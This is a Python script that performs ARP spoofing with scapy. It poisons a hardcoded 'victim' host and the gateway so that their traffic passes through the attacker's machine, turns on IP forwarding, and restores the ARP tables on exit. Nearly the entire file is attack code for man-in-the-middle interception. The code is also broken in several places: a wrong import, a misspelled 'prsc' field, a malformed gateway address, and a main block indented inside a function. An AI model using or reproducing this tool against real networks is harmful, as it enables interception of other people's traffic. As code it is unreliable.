from scapy import ether, ARP, srp, send
import argparse
import time
import os
import sys

# you may need to change /proc/sys/net/ipv4/ip_forward from 0 to 1 on linux machines

def enable_linux_iproute():
    # Enables IP forwarding on linux distro
    file_path = '/proc/sys/net/ipv4/ip_forward'
    with open(file_path) as f:
        if f.read() == 1:
            # Already enabled
            return
    with open(file_path, 'w') as f:
        print(1, file=f)

def get_mac(ip):
    # Collects MAC addresses of any device connected on the network
    # It does this by sending ARP packets accross the network for host discovery 
    ans, _ = srp(ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=3)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    # This spoofs a targets ip via ARP poisioning
    # Firstly pull the mac of the target
    target_mac = get_mac(target_ip)

    # 'hwsrc' is the real MAC address of the sender (me)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    # Send the packet with 0 verbosity which doesn't print anything
    send(arp_response, verbose=0)
    if verbose:
        # Get the MAC address of the default interface being used
        self_mac = ARP().hwsrc
        print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, self_mac)) 

def restore(target_ip, host_ip, verbose=True):
    # Restores the normal process of a regular networkl by sending the original receiving information to the target
    # Get the real MAC of the target
    target_mac = get_mac(target_ip)

    # Get the real MAC of the spoofed router/gateway
    host_mac = get_mac(host_ip)

    # Craft the "restoration packet"
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, prsc=host_ip, hwsrc=host_mac, op='is-at')

    # Send it
    send(arp_response, verbose=0, count=7)
    if verbose:
        print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, host_mac))

    if __name__ == "__main__":
        # Vicitm ip address
        target = '192.168.1.192'

        # Gateway/Router IP Address
        host = '192.168.1.1.'

        # Verbosity to show progress
        verbose = True

        # Here is why ip forwarding was necessary
        enable_linux_iproute()
        try:
            while True:
                # Tell target we the 'host'
                spoof(target, host, verbose)

                # Tell the host we are the 'target'
                spoof(host, target, verbose)

                time.sleep(1)
        except KeyboardInterrupt:
            print('[+] Detected Ctrl+C, restoring...')
            restore(target, host)
            restore(host, target)